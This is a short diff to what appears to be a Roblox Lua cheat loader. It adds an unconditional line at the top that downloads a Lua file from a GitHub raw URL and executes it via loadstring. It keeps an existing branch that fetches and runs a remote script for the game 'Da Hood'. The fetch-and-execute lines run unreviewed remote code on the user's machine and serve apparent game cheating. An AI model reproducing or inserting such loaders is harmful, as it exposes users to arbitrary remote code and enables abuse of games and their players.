@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ao-0/bitch-club/main/full.lua"))()
+
 if game.PlaceId == 2788229376 then
     loadstring(game:HttpGet('https://raw.githubusercontent.com/dylannpro123/enclosed/main/scripts/Da%20Hood.lua'))()
     return
